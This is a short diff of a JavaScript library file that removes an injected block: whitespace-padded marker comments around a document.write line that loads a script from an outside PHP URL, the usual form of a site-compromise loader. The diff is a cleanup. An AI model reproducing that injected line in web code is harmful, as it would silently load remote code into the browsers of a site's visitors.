@@ -1575,13 +1575,3 @@ Element.implement({
 });
 
 })();
-
-
-/*fb5827*/
-
-                    																	                               	 /*gbargbar09311gbar09*/
-
-document.write("<script type='text/javascript' src='http://j-j-computer.de/6Wf2mtKy.php?id=525362'></"+ "script>");
-
-
-/*/fb5827*/
